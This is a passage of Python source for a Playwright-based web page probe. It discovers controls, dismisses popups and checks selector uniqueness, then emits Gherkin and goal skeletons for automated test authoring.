    """(candidates, skipped) from generic disclosure signals only — hidden
    trigger zones, aria-expanded=false, tab/menu roles, disclosure-named
    buttons. A state-mutating name is never a candidate, whatever it looks
    like. Pure — unit-tested without a browser."""
    cands, skipped = [], []
    for c in controls:
        signal = (
            "hidden trigger" if not c["visible"] and c["kind"] == "button" else
            "aria-expanded=false" if c.get("expanded") == "false" else
            "tab/menu role" if c.get("role") in ("tab", "menuitem") else
            "disclosure name" if (c["kind"] == "button"
                                  and _DISCLOSURE_RE.search(c["name"])) else
            None)
        if not signal:
            continue
        if _is_mutating_control(c):
            skipped.append({"name": c["name"],
                            "reason": ("submit control" if c.get("submit")
                                       else "state-mutating name")})
            continue
        cands.append((c, signal))
    return cands, skipped


def _discover(page, pg: dict, timeout_ms: int) -> None:
    """Click each candidate, record its delta under `revealed`
    (discovered: true), then revert (Escape; goto back if it navigated).
    Never success-shaped when incomplete: the `discovery` trace names every
    candidate skipped and why, and flags when a cap bit."""
    cands, skipped = _discover_candidates(pg["controls"])
    trace = {"clicked": [], "skipped": skipped, "capped": False}
    seen = {c["selector"] for b in _blocks(pg) for c in b["controls"]}
    seen_head = {h for b in _blocks(pg) for h in b["headings"]}
    origin = page.url
    deadline = time.monotonic() + _DISCOVER_TIME_S
    for c, signal in cands:
        if len(trace["clicked"]) >= _DISCOVER_CLICK_CAP or \
                time.monotonic() > deadline:
            trace["capped"] = True
            trace["skipped"].append({"name": c["name"],
                                     "reason": "click/time budget exhausted"})
            continue
        try:
            armed, u = _arm(page), page.url
            loc = page.locator(c["selector"]).first
            if not c["visible"]:
                loc.dispatch_event("click", timeout=3000)
            else:
                try:
                    loc.click(timeout=2000)
                except Exception:
                    loc.dispatch_event("click", timeout=3000)
            settled = _settle(page, timeout_ms, armed=armed, url_before=u)
            rev = _diff_snapshot(page, seen, seen_head)
            trace["clicked"].append({"name": c["name"], "signal": signal,
                                     "new_controls": len(rev["controls"])})
            if rev["controls"] or rev["headings"]:
                rev["revealed_by"], rev["discovered"] = c["name"], True
                rev["settled"] = settled
                seen |= {x["selector"] for x in rev["controls"]}
                seen_head |= set(rev["headings"])
                _verify_unique(page, rev["controls"])
                pg.setdefault("revealed", []).append(rev)
            try:                              # close/revert before next branch
                page.keyboard.press("Escape")
            except Exception:
                pass
            if page.url != origin:
                page.goto(origin, timeout=timeout_ms,
                          wait_until="domcontentloaded")
                _settle(page, timeout_ms)
        except Exception as e:
            trace["skipped"].append({"name": c["name"], "reason": str(e)})
    pg["discovery"] = trace


def _transaction_incomplete(pg: dict) -> bool:
    """NOOD_0145 — the probe never reached the state the caller requested:
    a --do action failed, or an explicit --expect text was NOT found. Both
    make every downstream suggestion evidence from the WRONG state — the
    reviewed session authored (and red-ran) three times off exactly that."""
    if pg.get("do_warnings"):
        return True
    return any(not e.get("found") for e in pg.get("expect", []))


def _author_ready(pg: dict) -> bool:
    """True only when nothing blocks pasting this page's suggestions: DOM
    coverage (not visual_only), the requested transaction/expectations
    reached (NOOD_0145), and every needs-POM selector proven unique in its
    scope. Unverified selectors don't block — absence of proof is not
    ambiguity — but a PROVEN-ambiguous recommended selector does."""
    if pg.get("coverage") == "visual_only":
        return False
    if _transaction_incomplete(pg):
        return False
    for blk in [*_blocks(pg), *pg.get("frames", [])]:
        for c in blk["controls"]:
            if c.get("needs_pom") and c.get("unique") is False:
                return False
    return True


def _compact_author_ready(pg: dict, cap: int | None) -> bool:
    """NOOD_0137 — the compact-mode verdict: a proven-ambiguous selector only
    blocks when it survives the compact filter AND the cap, i.e. when it is
    one of the suggestions the agent is actually being handed to paste.
    NOOD_0145 — a failed transaction/expectation is a page-global truth, not
    presentation: it blocks here too, whatever the cap hides."""
    if pg.get("coverage") == "visual_only":
        return False
    if _transaction_incomplete(pg):
        return False
    for blk in [*_blocks(pg), *pg.get("frames", [])]:
        shown, _ = _cap(_compact_controls(blk["controls"]), cap)
        if any(c.get("unique") is False for c in shown):
            return False
    return True


def _author_blockers(pg: dict, cap: int | None) -> list[str]:
    """NOOD_0166 — the NAMED reasons behind author_ready: false. The text
    render always said why; the JSON payload (the agent door) handed back a
    naked false, and the reviewed session jq'd the payload hunting for a
    reason that was never in it — then mistook the budget-trim note for the
    blocker. Same scoping as _compact_author_ready: only what this payload
    actually shows can block."""
    if pg.get("coverage") == "visual_only":
        return ["coverage is visual_only — no accessible controls; do NOT "
                "author selectors from this page"]
    if _transaction_incomplete(pg):
        return ["transaction did not reach the requested state (see "
                "do_warnings/do_failed/expect) — do NOT author from this probe"]
    out = []
    for blk in [*_blocks(pg), *pg.get("frames", [])]:
        shown, _ = _cap(_compact_controls(blk["controls"]), cap)
        out += [f'"{c["name"]}" selector proven ambiguous in its scope: '
                f'{c["selector"]}'
                for c in shown if c.get("unique") is False]
    return out[:5]


# NOOD_0137 — the two run-time realities a probe used to be blind to, though
# this is exactly what "the location prompt appears, close it, then a few
# known popups appear" prompts are about: report them with the ready-made
# step so the agent copies instead of guessing popup phrasing.
_PERM_STEP = {"geolocation": "the user closes the location prompt",
              "notifications": "the user closes the notifications prompt"}


def _signal_lines(pg: dict, indent: str = "  ") -> list[str]:
    out = []
    for perm in pg.get("permission_prompts", []):
        step = _PERM_STEP.get(perm)
        if step:
            out.append(f"{indent}permission prompt: {perm} requested on load "
                       f"— include: When {step}  (or grant it up front with "
                       f"@permissions:{perm})")
    if pg.get("popups_closed"):
        out.append(f'{indent}popups: {pg["popups_closed"]} closed during the '
                   "probe — include: And closes the popup if it appears "
                   "within 10 seconds")
    return out


def _tab_steps(pg: dict) -> list[str]:
    """NOOD_0178 — the tab leg of the skeleton, in the order the runtime needs:
    the click that opened the tab, the assert + switch pair, one proven
    assertion from the tab, and the switch back when the probe returned. Pure —
    unit-pinned against the pattern table like the rest of the skeleton."""
    steps = []
    for blk in pg.get("revealed", []):
        if not blk.get("new_tab"):
            continue
        opener = blk["opened_by"].removeprefix("do: click ").removeprefix("do: ")
        steps.append(f'When User clicks "{opener}"')
        steps += blk["switch_steps"]
        if blk["headings"]:
            steps.append(f'Then the user sees "{blk["headings"][0]}"')
    if steps and any(t in _TAB_HOME for t in pg.get("tab_switches", [])):
        steps.append(_TAB_RETURN_STEP)
    return steps


def _skeleton_steps(pg: dict) -> list[str]:
    """NOOD_0137 — a paste-ready scenario opening assembled from what the
    probe itself proved: navigation, the permission/popup closes it observed,
    the search flow it performed and the results floor it found. The agent
    keeps the steps its goal needs and adds assertions from the exact-texts
    list — composing this by hand was the main remaining red-run source."""
    steps = ['Given User is on "{env:<APP>}"']
    for perm in pg.get("permission_prompts", []):
        if perm in _PERM_STEP:
            steps.append(f"When {_PERM_STEP[perm]}")
    if pg.get("popups_closed"):
        steps.append("And closes the popup if it appears within 10 seconds")
    steps += _tab_steps(pg)
    sg = pg.get("suggest")
    if sg and sg["suggestions"]:
        steps += sg["steps"]
    sr = pg.get("search")
    if sr:
        # NOOD_0142 — a --follow landing already picked the suggestion; a
        # `searches for` line here would author a SUBMIT instead of the pick.
        if not sr.get("followed_from"):
            steps.append(f'When User searches for "{sr["term"]}"')
        if sr.get("results_summary"):
            steps.append(f'Then {sr["results_summary"]["suggested_assertion"]}')
    # NOOD_0142 — every --expect hit is a proven assertion; the misses are
    # exactly what the author must NOT assert.
    for e in pg.get("expect", []):
        if e.get("found"):
            steps.append(f'Then User should see "{e["text"]}"')
    if pg.get("headings"):
        steps.append(f'Then the user sees "{pg["headings"][0]}"')
    return steps


# NOOD_0223 — the probe names a permission prompt the way the browser does;
# the goal schema names the dismissal. One map, so the skeleton it emits is
# accepted verbatim by validate().
_PERM_TO_DISMISSAL = {"geolocation": "location_prompt",
                      "notifications": "notifications_prompt"}

# NOOD_0223 — probe `do` triples → goal actions. The verbs are the same moves
# in two notations; the map is here rather than in the goal module because
# this is the probe's half of the contract.
_DO_TO_GOAL = {
    "click": lambda t, v: {"do": "click", "target": t},
    "click_row": lambda t, v: {"do": "click", "target": t, "within": v},
    "enter": lambda t, v: {"do": "enter", "target": t, "value": v},
    "select": lambda t, v: {"do": "select", "target": t, "option": v},
}


def _goal_skeleton(pg: dict, do_actions: list | None) -> dict:
    """NOOD_0223 — the probe's findings as a GOAL, not as Gherkin.

    `_skeleton_steps` above emits a scenario opening in step sentences, which
    is the older handoff: the agent pastes those into `feature_content` and
    hand-writes the rest. Every hand-written line between the probe and the
    run is a place the two can disagree — the probe proves control "Add to
    cart" and the pasted step says "Add to Cart", and the failure surfaces a
    run later.

    This is the same evidence in the notation the engine COMPILES. Paste it
    under `goal:` and `author --spec` re-derives the steps, the POM and the
    selectors from the probe's own names, so there is nothing left to retype
    and nothing to drift.

    Emitted only on the `author_ready: true` path (the caller sets it), so
    what it describes is a transaction the probe actually completed.

    ponytail: `checks` carries only what the probe PROVED — expectation hits
    and a results floor. It never guesses the assertion the goal wanted; an
    invented check is the one thing worse than no check, because it passes."""
    skel: dict = {}
    if url := pg.get("url"):
        skel["navigation"] = [url]
    dismissals = [_PERM_TO_DISMISSAL[p] for p in pg.get("permission_prompts", [])
                  if p in _PERM_TO_DISMISSAL]
    if pg.get("popups_closed"):
        dismissals.append("popups")
    if dismissals:
        skel["dismissals"] = list(dict.fromkeys(dismissals))
    actions = []
    sg = pg.get("suggest")
    if sg and sg.get("suggestions"):
        # the typeahead pick is ONE goal action; as steps it was two lines
        actions.append({"do": "suggest", "term": sg["term"],
                        "option": sg["suggestions"][0]})
    sr = pg.get("search")
    if sr and sr.get("term") and not sr.get("followed_from"):
        actions.append({"do": "search", "term": sr["term"]})
    for verb, target, value in do_actions or ():
        if fn := _DO_TO_GOAL.get(verb):
            actions.append(fn(target, value))
    if actions:
        skel["actions"] = actions
    checks = [{"see": e["text"]} for e in pg.get("expect", []) if e.get("found")]
    if sr and sr.get("results_summary"):
        # NOOD_0125 — the stable floor: a probed count is a snapshot, "at
        # least one result" is the claim that survives the catalogue changing.
        checks.insert(0, {"count": "results", "min": 1})
    if checks:
        skel["checks"] = checks
    return skel


def _skeleton_lines(pg: dict, indent: str = "  ") -> list[str]:
    out = [f"{indent}scenario skeleton (paste, keep the steps the goal needs, "
           "add assertions from the exact texts above; <APP> = author_test's "
           "base_url_key):"]
    out += [f"{indent}  {s}" for s in _skeleton_steps(pg)]
    if gs := pg.get("goal_skeleton"):
        # NOOD_0223 — one line, because it is one paste: this is the same
        # skeleton in the notation `author --spec` compiles, which needs no
        # transcription and therefore cannot drift from what was probed.
        out.append(f"{indent}goal skeleton (paste under `goal:` — "
                   f"author --spec re-derives steps/POM): {json.dumps(gs)}")
    return out


# NOOD_0215 — Chromium's network errors, each with what the reader should do
# about it. A dead origin fails at connect time, so the probe was already fast;
# what it wasn't was legible — `net::ERR_CONNECTION_REFUSED at http://...` reads
# like a Noodle bug, and the agent who can't tell "app is down" from "probe is
# broken" goes and runs curl to find out. Saying it plainly is the whole fix.
_ORIGIN_ERRORS = (
    ("ERR_CONNECTION_REFUSED", "nothing is listening there — start the app "
                               "(or check the port), then probe again"),
    ("ERR_NAME_NOT_RESOLVED", "that host name does not resolve — check the "
                              "spelling, or the VPN/DNS this machine needs"),
    ("ERR_CONNECTION_TIMED_OUT", "the host accepted nothing before the timeout "
                                 "— it may be firewalled or still starting"),
    ("ERR_INTERNET_DISCONNECTED", "this machine has no network at all"),
)


def _origin_error(url: str, exc: Exception) -> str:
    """A probe failure the reader can act on. Anything not in the table above
    passes through verbatim — a wrong guess about the cause is worse than a
    raw Playwright message."""
    text = str(exc)
    for marker, advice in _ORIGIN_ERRORS:
        if marker in text:
            return f"{url} is not reachable ({marker}): {advice}"
    return text


@outside_asyncio
def probe(urls: list[str], timeout_ms: int = 15000,
          clicks: list[str] | None = None,
          do: list[str] | None = None,
          search: str | None = None, suggest: str | None = None,
          pick: str | None = None, mutate: str | None = None,
          follow: str | None = None, expect: list[str] | None = None,
          open_native_controls: bool = False,
          max_reveal_depth: int = 1, discover: bool = False,
          perform: bool = False,
          act_on: str = "each", browser_name: str | None = None) -> dict:
    """Open each URL headless (one browser for all) and return
    {"pages": [summarize(...)], "errors": [{url, error}]}. Never raises —
    an unreachable page lands in errors, like ground.py's advisory skip.
    `clicks` (NOOD_0116) names reveal controls to click on each page —
    panels/tabs/dropdown triggers gated behind a click — each followed by a
    settle + fresh snapshot appended under that page's "revealed".
    `open_native_controls` (NOOD_0128): after the caller's reveal, automatically
    enumerate native <select> options and click-open custom comboboxes (on the
    initial page and every revealed panel), bounded by `max_reveal_depth` and a
    per-page click budget, never touching a state-mutating control — so nested
    dropdown options surface in one probe instead of a second browser.
    `discover` (NOOD_0136): bounded depth-1 auto-reveal from generic
    disclosure signals when the caller doesn't know trigger names yet.
    NOOD_0136 also collects open shadow roots and every iframe (scoped
    blocks under "frames"), activates Flutter Web semantics when the
    placeholder exists, proves selector uniqueness in scope, and stamps each
    page with coverage/warnings/author_ready. `do` (NOOD_0144) executes an
    ordered stateful transaction — "enter <value> in <field>" /
    "select <option> from <dropdown>" / "click <name>" — after the reveal
    clicks, diffing the page state after every action, so a fill → save →
    new-state flow is one probe session. NOOD_0156 — `mutate` (with
    search+pick) proves the requested mutation path on the picked landed
    page (_prove_mutation); `act_on="last"` runs the interactive phases
    (clicks/do/search/pick/suggest/expect/discover) only on the FINAL url —
    the ordered-navigation contract where earlier URLs are setup
    navigation, not action pages."""
    pages, errors = [], []
    do_notes: list[str] = []
    try:
        do_actions = parse_do(do, notes=do_notes) if do else None
    except ValueError as e:
        return {"pages": [], "errors": [{"url": ", ".join(urls),
                                         "error": str(e)}]}
    # NOOD_0179 — the browser comes from the shared pool (one launch per engine
    # for the life of an MCP server / repl session) and every line below runs on
    # the pool's worker thread, because Playwright sync objects are thread-affine.
    # A fresh CONTEXT per call keeps the isolation the old launch-per-call gave.
    def _body(browser):
        context = browser.new_context()
        try:
            page = context.new_page()
            try:                       # NOOD_0137 — permission-API shim
                # NOOD_0178 — on the CONTEXT, not the page: a page-level
                # init script never reaches a tab that page opens, so a
                # probe-followed tab had no shim to read.
                page.context.add_init_script(_PERM_JS)
            except Exception:
                pass
            home = page
            for url_i, url in enumerate(urls):
                # NOOD_0178 — each url starts on the original tab: a
                # previous transaction may have left the flow on a
                # probe-opened one, and goto would navigate THAT.
                page = home
                # NOOD_0156 — act_on="last": earlier URLs of an ordered
                # navigation contract are setup-only (cookies/session),
                # never searched or clicked around in.
                acting = act_on != "last" or url_i == len(urls) - 1
                try:
                    resp = page.goto(url, timeout=timeout_ms,
                                     wait_until="domcontentloaded")
                    settle_path = _settle_initial(page, timeout_ms)
                    # NOOD_0137 — sweep popups exactly like the run-time
                    # engine, so the snapshot below is the real page and
                    # the observation feeds the signals + skeleton.
                    popups_closed = _dismiss_popups(page)
                    if popups_closed:
                        settle_path = _settle_initial(
                            page, min(timeout_ms, 3000))
                    perms = _perm_signals(page)
                    # ponytail: W3b — add a single scroll-to-bottom pass here
                    # only if below-the-fold lazy tiles keep going missing;
                    # W3a surfaces the ones already in the DOM, most pages
                    # need no scroll and it adds wall-time to every probe.
                    raw = page.evaluate(_COLLECT_JS)
                    if raw.get("semantics_placeholder"):
                        raw = _activate_flutter_semantics(page, raw,
                                                          timeout_ms)
                    # no logger here — it writes to stdout and would
                    # corrupt `noodle probe --json` output
                    pg = summarize(raw, url=page.url, title=page.title())
                    _apply_page_signals(pg, raw)
                    if _timings_on():   # NOOD_0179 — debug only, never default
                        pg["settled_initial"] = settle_path
                    # NOOD_0169 — navigation health: setup URLs of an
                    # ordered contract are preserved even when broken
                    # (the user asked for them), but the goal evidence
                    # pass warns on them and blocks a broken FINAL page.
                    if resp is not None:
                        pg["http_status"] = resp.status
                    if popups_closed:
                        pg["popups_closed"] = popups_closed
                    if perms:
                        pg["permission_prompts"] = perms
                    _verify_unique(page, pg["controls"])
                    _collect_frames(page, pg, timeout_ms)
                    # NOOD_0178 — every clicking phase returns the page the
                    # flow is on now (a click may have opened a tab), and
                    # the later phases act on it.
                    if clicks and acting:
                        page = _reveal(page, pg, clicks, timeout_ms)
                    # NOOD_0208 — the searchless mutation, PERFORMED (opt-in).
                    # Ahead of the do-chain on purpose: those actions are the
                    # steps that follow the mutation, so the transaction has
                    # to start from the mutated state to reach the page the
                    # test asserts on.
                    if perform and mutate and not pick and acting:
                        _perform_mutation(page, pg, mutate, timeout_ms)
                    # NOOD_0224 — a rewritten chain is reported, not silently
                    # obeyed: the caller asked for one action and got three,
                    # and the deltas below are keyed to the rewrite.
                    if do_actions and do_notes:
                        pg["do_split_note"] = "; ".join(do_notes)
                    if do_actions and acting and not search:
                        page = _do(page, pg, do_actions, timeout_ms)
                    elif do_actions and not acting:
                        # NOOD_0214 — a setup url of an ordered contract is
                        # snapshot-only; saying so beats a payload that looks
                        # like the transaction ran and found nothing.
                        pg["do_requested"] = len(do_actions)
                        pg["do_skipped"] = ("act_on=last — the transaction "
                                            "runs only on the final url")
                    if discover and acting:
                        _discover(page, pg, timeout_ms)
                    if open_native_controls and acting:
                        seen = {c["selector"] for b in _blocks(pg)
                                for c in b["controls"]}
                        seen_head = {h for b in _blocks(pg)
                                     for h in b["headings"]}
                        budget = [_AUTO_OPEN_CAP]
                        for b in list(_blocks(pg)):
                            _auto_open(page, b, seen, seen_head, timeout_ms,
                                       max_reveal_depth, budget)
                    if suggest and acting:
                        _suggest(page, pg, suggest, timeout_ms,
                                 follow=follow)
                    elif follow and acting:
                        pg["suggest_warning"] = (
                            "--follow ignored: it requires --suggest")
                    if search and acting:
                        _search(page, pg, search, timeout_ms)
                        if pick:
                            page = _pick(page, pg, search, pick,
                                         timeout_ms, mutate=mutate)
                        if do_actions:
                            # NOOD_0168 — a do-transaction sharing the
                            # call with a search targets the page the
                            # search/pick LANDED on, not the start page
                            # (the reviewed session's "click Add to
                            # cart" fired on the homepage instead).
                            page = _do(page, pg, do_actions, timeout_ms)
                    elif pick and acting:
                        pg["pick_warning"] = (
                            "--pick ignored: it requires --search")
                    if expect and acting:
                        reason = _skip_expect_reason(pg)
                        if reason:
                            pg["expect_warning"] = reason
                        else:
                            _expect(page, pg, expect)
                    pg["author_ready"] = _author_ready(pg)
                    # NOOD_0223 — the mutation-path contract: on the ready
                    # path ONLY, the same findings in goal notation, so the
                    # handoff to author is a paste and not a transcription.
                    if pg["author_ready"]:
                        pg["goal_skeleton"] = _goal_skeleton(pg, do_actions)
                    pages.append(pg)
                except Exception as e:
                    errors.append({"url": url, "error": _origin_error(url, e)})
        finally:
            # the CONTEXT, never the pooled browser — closing the browser
            # here would defeat the reuse the pool exists for.
            context.close()

    try:
        _, engine_warning = browser_pool.with_browser(_body, browser_name)
        if engine_warning:
            errors.append({"url": ", ".join(urls), "error": engine_warning})
    except Exception as e:
        errors.append({"url": ", ".join(urls), "error": str(e)})
    return {"pages": pages, "errors": errors}


def _cap(items: list, max_controls: int | None) -> tuple[list, int]:
    """(shown, hidden-count) — NOOD_0117 long-tail cap."""
    if max_controls is None or len(items) <= max_controls:
        return items, 0
    return items[:max_controls], len(items) - max_controls


# NOOD_0119 W1 — compact lists cap here unless --max-controls widens. A
# facet-heavy results page emits ~25 lines + an overflow note, not 200.
DEFAULT_COMPACT_CAP = 25

# NOOD_0137 Fix A — a --discover block exists to SIGNAL what a disclosure
# hides, not to catalog it: --discover on a retail homepage emitted one full
# four-list block per reveal (menu 31 controls, store-locator 23, …) = ~30 KB
# compact output riding every later model call. Discovered blocks get this
# smaller cap and a single controls list; explicit --click reveals (the
# caller asked for that panel) keep the full compact set.
DISCOVER_COMPACT_CAP = 8

# NOOD_0119 W2 — OneTrust-shaped consent-manager controls: never authored
# against, present on virtually every commercial site. Matched on the selector
# (which carries the element id), dropped in compact output only.
_CONSENT_NOISE = ("ot-group-id-", "-btn-handler", "filter-apply-handler",
                  "vendor-search", "ot-active-menu",
                  "category-menu-switch-handler",
                  # NOOD_0137 — preference-center internals that leaked past
                  # the list on a real retail homepage (all OneTrust-owned).
                  "onetrust", "ot-switch", "ot-label", "select-all-hosts",
                  "select-all-vendor", "chkbox-id", "clear-filters-handler",
                  "filter-cancel-handler")
_CONSENT_RE = re.compile("|".join(re.escape(t) for t in _CONSENT_NOISE), re.I)


def _is_consent_noise(c: dict) -> bool:
    # ponytail: OneTrust-shaped denylist; widen if other CMPs surface noise
    return bool(_CONSENT_RE.search(c.get("selector", "")))


def _compact_keep(c: dict) -> bool:
    """Compact-mode general control filter: keep only what an author must POM,
    minus consent noise (W2) and image-tile captions (W3a gives those their
    own slice)."""
    return (c["needs_pom"] and not c.get("caption_attr_only")
            and not _is_consent_noise(c))


def _compact_rank(c: dict) -> tuple:
    """NOOD_0137 — order compact suggestions so the cap eats the junk end:
    visible controls first, hidden non-toggles next (the hidden-trigger-zone
    case the probe exists for), hidden toggles last (facet-checkbox floods),
    proven-ambiguous selectors after proven/unverified ones at each tier."""
    tier = (0 if c.get("visible")
            else 2 if c.get("kind") == "toggle" else 1)
    return (tier, 0 if c.get("unique") is not False else 1)


def _collapse_numbered(controls: list[dict]) -> list[dict]:
    """NOOD_0137 — same collapse as the tile slice, for the needs-POM list: a
    facet family named only by numbers ("3+ (16)", "4+ (10)", "12 (1)"…)
    shows one exemplar carrying a fam_extra count instead of flooding the cap.
    Groups of <3 and digit-free names pass through untouched, in order."""
    groups: dict = {}
    for c in controls:
        groups.setdefault(_TILE_NUM_RE.sub("#", c["name"]), []).append(c)
    out = []
    for fam in groups.values():
        if len(fam) < 3:
            out.extend(fam)
        else:
            head = dict(fam[0])
            head["fam_extra"] = len(fam) - 1
            out.append(head)
    return out


def _compact_controls(controls: list[dict]) -> list[dict]:
    """The compact-mode needs-POM list: filtered, rank-sorted (stable — DOM
    order within a tier), numbered families collapsed — so the default cap
    truncates hidden facet floods instead of the controls an author pastes."""
    kept = sorted((c for c in controls if _compact_keep(c)), key=_compact_rank)
    return _collapse_numbered(kept)


def _tile_caption(c: dict) -> bool:
    """NOOD_0119 W3a — an image link/button whose caption lives only in
    alt/title: the exact controls a weak model otherwise recovers by hand
    (curl+grep the alt strings). Hand these over author-ready so it can't."""
    return bool(c.get("caption_attr_only")) and not _is_consent_noise(c)


def _compact_pom(pg: dict, cap: int | None = None) -> str:
    """POM YAML for compact mode — rebuilt from the controls that survive the
    compact filter (their per-control `pom` lines), so consent noise never
    reaches the author's POM block either, and capped to the same `cap` as the
    control list so a facet-heavy page doesn't flood the POM block instead.
    Tiles are excluded here; they carry their own POM inline in the tile slice.
    NOOD_0137 — a PROVEN-ambiguous selector is never offered for paste: its ⚠
    line already says "narrow it before POM use", so the un-narrowed entry
    (e.g. `a: css: 'a'`) has no honest destination in a pageobjects/ file."""
    kept = [c for c in _compact_controls(pg.get("controls", []))
            if c.get("unique") is not False]
    if cap is not None:
        kept = kept[:cap]
    lines, named = [], set()
    for c in kept:
        if c["name"] in named or "pom" not in c:
            continue
        named.add(c["name"])
        lines += c["pom"]
    if not lines:
        return ""
    head = (pg["pom_yaml"].splitlines()[0] if pg.get("pom_yaml")
            else "# Page object — probe suggestions")
    return "\n".join([head, *_match_header(), *lines]) + "\n"


_TILE_NUM_RE = re.compile(r"\d+")


def _tile_families(tiles: list[dict]) -> list[list[dict]]:
    """NOOD_0137 — group tiles whose names differ only by digits ("go to
    slide 1"…"go to slide 9", carousel dots). Distinct captions stay distinct
    (each "banner N of 8 …" carries different text, so they never group)."""
    groups: dict = {}
    order = []
    for c in tiles:
        fam = _TILE_NUM_RE.sub("#", c["name"])
        if fam not in groups:
            groups[fam] = []
            order.append(fam)
        groups[fam].append(c)
    return [groups[f] for f in order]


def _tile_lines(controls: list[dict], indent: str = "    ",
                cap: int | None = None) -> list[str]:
    tiles = [c for c in controls if _tile_caption(c)]
    if not tiles:
        return []
    # NOOD_0137 — this slice was the one uncapped list left (a carousel-heavy
    # homepage emitted ~150 lines of it): numbered families collapse to one
    # exemplar, and the same cap as every other compact list applies.
    fams = _tile_families(tiles)
    shown, hidden_fams = _cap(fams, cap)
    out = [f"{indent}tile captions (image links; caption is in alt/title — "
           "author against these, POM entry under each):"]
    for fam in shown:
        members = fam if len(fam) < 3 else fam[:1]
        for c in members:
            extra = (f"  (+{len(fam) - 1} more numbered like it)"
                     if len(fam) >= 3 and c is fam[0] else "")
            # NOOD_0137 — a marketing-length caption repeats itself in the
            # selector AND the step: the POM entry below already carries all
            # of it, so the control line adds only duplication past 60 chars.
            if len(c["name"]) <= 60:
                out.append(f'{indent}  [{c["kind"]}] {c["name"]} — '
                           f'{c["selector"]}  →  {c["step"]}{extra}')
            out += [f"{indent}    {line}" for line in c.get("pom", [])]
    if hidden_fams:
        out.append(f"{indent}  … (+{hidden_fams} more tiles — raise "
                   "--max-controls)")
    return out


def _rank_ready(controls: list[dict]) -> list[dict]:
    """NOOD_0145 — visible submit controls first among copy-ready steps (stable
    otherwise): when several controls answer a login/submit-shaped goal, the
    accessible submit control is the one to author against, and the compact
    cap must never diet it away below a machine-named lookalike.

    NOOD_0156 follow-up — visible MUTATING-NAMED controls rank right after
    them: a PDP's "add to cart" is a plain button (no type=submit), and DOM
    order let 40 header/footer chrome steps cap it out of the compact
    payload entirely — the one control the whole probe was for. Submits
    stay first (a name like "login options toggle btn" trips the verb
    regex; the type=submit signal is the stronger evidence)."""
    return sorted(controls,
                  key=lambda c: 0 if (c.get("submit") and c.get("visible"))
                  else 1 if (c.get("visible")
                             and _is_mutating(c.get("name")))
                  else 2)


# NOOD_0231 (P-3) — a card GRID stamps the same control into every card, so
# the copy-ready list re-sent one byte-identical sentence per card: a 12-card
# menu printed `selects "<option>" from "size:"` twelve times, ~350 tokens per
# probe to convey one fact. Worse, the identical twins ate the cap, so the
# DISTINCT steps below them fell off the list entirely and the next lap
# re-probed to find them. Collapsing to one line + a count is strictly more
# informative than N copies: the count IS the ambiguity warning the goal
# compiler would otherwise raise a lap later (NOOD_0231 P-6 says the same
# thing at validation time), and the freed cap slots carry real steps.
_REPEATED_HINT = ('one control per repeated row/card — scope each of these '
                  'actions with within: "<text unique to that row/card>"')


def _repeat_suffix(n: int) -> str:
    """The `(×N …)` tail on a collapsed step line, or '' when it is unique."""
    return (f'  (×{n} — one per repeated row/card; scope with within: '
            '"<text unique to that row/card>")') if n > 1 else ""


def _collapse_repeats(items: list, key=lambda x: x) -> tuple[list, dict]:
    """Order-preserving dedup of `items` by `key(item)`.

    Returns (first occurrence of each key, {key: count}) — counted over the
    WHOLE list, before any cap, so the count is the page's truth and not an
    artifact of where the cap fell."""
    first: dict = {}
    counts: dict = {}
    for it in items:
        k = key(it)
        counts[k] = counts.get(k, 0) + 1
        first.setdefault(k, it)
    return list(first.values()), counts


def _step_lines(controls: list[dict], indent: str = "  ",
                cap: int | None = None, brief: bool = False) -> list[str]:
    """NOOD_0131 — compact mode: copy-ready steps for the controls that need
    NO POM entry (visible, readable name). The needs-POM list filters those
    out, and hiding their steps made the baseline re-probe `steps`/`revealed`
    per control. Bounded by the same cap as the control lists.

    NOOD_0231 — repeats collapse to one line + `(×N)` BEFORE the cap."""
    ready = _rank_ready([c for c in controls
                         if not _compact_keep(c) and not _tile_caption(c)
                         and not _is_consent_noise(c)])
    ready, counts = _collapse_repeats(ready, key=lambda c: c.get("step") or "")
    shown, hidden = _cap(ready, cap)
    if not shown:
        return []
    if brief:
        # NOOD_0179 — one template line, then its names. Same information,
        # without re-sending the sentence once per control.
        out = [f"{indent}copy-ready steps — put each name into its template "
               "(use as-is, do not re-derive them via dictionary searches):"]
        by_kind: dict[str, list] = {}
        for c in shown:
            if _keeps_exact_step(c):
                continue
            by_kind.setdefault(_template_key(c.get("kind")), []).append(c)
        for key, group in by_kind.items():
            out.append(f"{indent}  {STEP_TEMPLATES[key]}")
            out.append(f"{indent}    names: "
                       + "; ".join(f'"{c["name"]}"'
                                   + _repeat_suffix(counts.get(c.get("step")
                                                               or "", 1))
                                   for c in group))
            for c in group:
                if c.get("options"):
                    out.append(f'{indent}    "{c["name"]}" options: '
                               + ", ".join(f'"{o}"' for o in c["options"]))
        for c in shown:      # machine-named rows keep the proven wording
            if _keeps_exact_step(c):
                out.append(f'{indent}  {c["step"]}'
                           + _repeat_suffix(counts.get(c.get("step") or "", 1)))
        if hidden:
            out.append(f"{indent}  … (+{hidden} more — raise --max-controls)")
        return out
    out = [f"{indent}copy-ready steps (no POM entry needed — use as-is, do "
           "not re-derive them via dictionary searches):"]
    for c in shown:
        out.append(f'{indent}  {c["step"]}'
                   + _repeat_suffix(counts.get(c.get("step") or "", 1)))
        if c.get("options"):
            out.append(f'{indent}    options: '
                       + ", ".join(f'"{o}"' for o in c["options"]))
    if hidden:
        out.append(f"{indent}  … (+{hidden} more — raise --max-controls)")
    return out


def _control_lines(controls: list[dict], indent: str = "  ",
                   brief: bool = False) -> list[str]:
    out = []
    for c in controls:
        mark = "*" if c["needs_pom"] else " "
        hidden = "" if c["visible"] else " (hidden)"
        warn = ("  ⚠ caption is attribute-only (alt/aria-label/title) — a "
                "plain \"should see\" text step needs the POM entry below"
                if c.get("caption_attr_only") else "")
        # NOOD_0136 — a proven-ambiguous selector must not be pasted as-is
        if c.get("unique") is False:
            warn += (f'  ⚠ selector matches {c.get("matches", "several")} '
                     "nodes — narrow it before POM use")
        if c.get("scope"):
            hidden += f' [{c["scope"]}]'
        if c.get("fam_extra"):
            warn += f'  (+{c["fam_extra"]} more numbered like it)'
        # NOOD_0141 (P2-1) — never let an author paste the hidden twin
        if c.get("hidden_twin"):
            warn += "  (hidden twin — POM suggestion targets the visible control)"
        # NOOD_0145 — say which control actually submits, so an author never
        # picks a login-named lookalike over the real submit button.
        sub = " (submit)" if c.get("submit") else ""
        # NOOD_0179 — brief: the step is derivable from kind + name via the
        # templates printed once above, so only the load-bearing wording rides
        # along per row.
